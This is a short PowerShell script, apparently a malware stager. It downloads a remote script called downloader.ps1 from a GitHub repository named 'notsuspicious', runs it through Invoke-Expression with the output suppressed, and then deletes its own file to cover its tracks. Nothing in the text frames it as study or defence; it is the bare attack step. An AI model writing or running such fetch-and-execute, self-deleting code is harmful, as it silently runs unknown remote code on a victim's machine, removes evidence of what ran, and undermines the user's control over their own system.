Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1" -UseBasicParsing).Content | Out-Null
Remove-Item $PSCommandPath -Force 